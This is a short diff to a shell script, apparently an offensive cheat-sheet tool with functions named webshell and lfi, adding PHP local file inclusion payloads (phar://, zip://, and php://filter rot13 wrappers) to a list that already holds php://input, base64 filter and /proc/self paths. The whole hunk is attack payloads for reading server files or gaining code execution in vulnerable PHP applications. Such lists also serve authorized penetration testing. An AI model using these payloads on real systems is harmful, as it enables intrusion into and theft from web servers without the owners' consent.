@@ -262,7 +262,10 @@ webshell()
 lfi()
 {
    echo "php://input"
+   echo "phar://xxxx/x.php"
+   echo "zip://xxxx%23x.php"
    echo "php://filter/convert.base64-encode/resource="
+   echo "php://filter/string.rot13/resource="
    echo "/proc/self/environ"
    echo "/proc/self/cmdline"
    echo "/proc/self/fd/x"
